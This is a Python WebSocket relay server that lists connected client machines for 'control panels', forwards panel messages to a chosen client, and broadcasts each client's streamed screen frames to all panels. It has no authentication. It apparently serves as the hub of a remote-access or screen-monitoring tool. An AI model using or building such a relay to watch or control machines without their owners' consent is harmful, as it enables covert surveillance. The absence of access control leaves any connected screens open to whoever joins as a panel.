import asyncio
import websockets
import json
import os

CONNECTED_CLIENTS = {}
CONNECTED_PANELS = set() # Using a set is more efficient for panels

async def broadcast_client_list():
    """Sends the current list of clients to all connected panels."""
    if not CONNECTED_PANELS:
        return
    
    client_list = {
        client_id: {"hostname": info["hostname"]}
        for client_id, info in CONNECTED_CLIENTS.items()
    }
    list_payload = json.dumps({"type": "client_list", "clients": client_list})
    
    # asyncio.gather is robust against a panel disconnecting during broadcast
    await asyncio.gather(
        *[panel.send(list_payload) for panel in CONNECTED_PANELS],
        return_exceptions=True
    )

async def register(websocket, role, data):
    """Registers a new panel or client."""
    if role == "panel":
        CONNECTED_PANELS.add(websocket)
        print(f"[*] Control Panel connected. Total panels: {len(CONNECTED_PANELS)}")
    elif role == "client":
        client_id = data.get("id")
        hostname = data.get("hostname", "Unknown")
        CONNECTED_CLIENTS[client_id] = {"ws": websocket, "hostname": hostname}
        print(f"[*] Client '{hostname}' ({client_id}) connected. Total clients: {len(CONNECTED_CLIENTS)}")
    
    await broadcast_client_list()

async def unregister(websocket, role, data):
    """Unregisters a disconnected panel or client."""
    if role == "panel":
        CONNECTED_PANELS.discard(websocket)
        print("[*] Control Panel disconnected.")
    elif role == "client":
        client_id = data.get("id")
        if client_id in CONNECTED_CLIENTS:
            del CONNECTED_CLIENTS[client_id]
            print(f"[*] Client '{client_id}' disconnected.")
            await broadcast_client_list()

async def route_messages(websocket, role, initial_data):
    """The main message routing loop for a single connection."""
    async for message in websocket:
        data = json.loads(message)

        if role == "panel":
            target_id = data.get("target_id")
            if target_id and target_id in CONNECTED_CLIENTS:
                # Forward the entire message to the target client
                await CONNECTED_CLIENTS[target_id]["ws"].send(json.dumps(data))
        
        elif role == "client":
            client_id = initial_data.get("id")
            # Re-package the message for broadcasting to panels
            broadcast_payload = json.dumps({
                "type": "screen_data",
                "session_id": client_id,
                "data": data.get("data"),
                "width": data.get("width"),
                "height": data.get("height")
            })
            if CONNECTED_PANELS:
                await asyncio.gather(
                    *[panel.send(broadcast_payload) for panel in CONNECTED_PANELS],
                    return_exceptions=True
                )

async def handler(websocket, path):
    """Handles a new connection, identifies it, and starts the message router."""
    print(f"[*] New connection from {websocket.remote_address}")
    initial_data = None
    role = None
    try:
        initial_message = await websocket.recv()
        initial_data = json.loads(initial_message)
        role = initial_data.get("role")

        if role not in ["panel", "client"]:
            await websocket.close(1011, "Unknown role provided.")
            return

        await register(websocket, role, initial_data)
        await route_messages(websocket, role, initial_data)

    except websockets.ConnectionClosed:
        print(f"[!] Connection closed for {role or 'unknown party'}.")
    except Exception as e:
        print(f"[!!!] An unexpected error occurred in handler: {e}")
    finally:
        if role and initial_data:
            await unregister(websocket, role, initial_data)

async def main():
    host = "0.0.0.0"
    port = int(os.environ.get("PORT", 8765))
    print(f"[*] Starting plain WebSocket server on ws://{host}:{port}")
    async with websockets.serve(handler, host, port, max_size=None):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())